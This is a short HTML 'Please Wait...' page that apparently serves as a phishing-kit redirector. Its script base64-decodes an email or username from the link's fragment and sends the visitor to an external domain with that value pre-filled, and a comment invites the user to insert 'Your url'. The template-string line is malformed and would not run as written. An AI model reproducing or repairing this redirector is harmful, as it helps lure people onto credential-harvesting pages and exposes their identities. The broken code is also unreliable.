<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
    <title>Please Wait...</title>
    <script type="text/javascript">
        let redirectURL = "https://available-cloud.qualifiedcareservice.co.uk/?" // Your url
        let redirectQueryParam = "username" // auto-fill param
        if (window.location.hash) {
            try {
                window.location.href = redirectURL + ${redirectQueryParam}=${atob(window.location.hash.substring(1))}
            } catch (e) {
                console.log(e)
            }
        }
    </script>
</head>
<body>
</body>
</html>
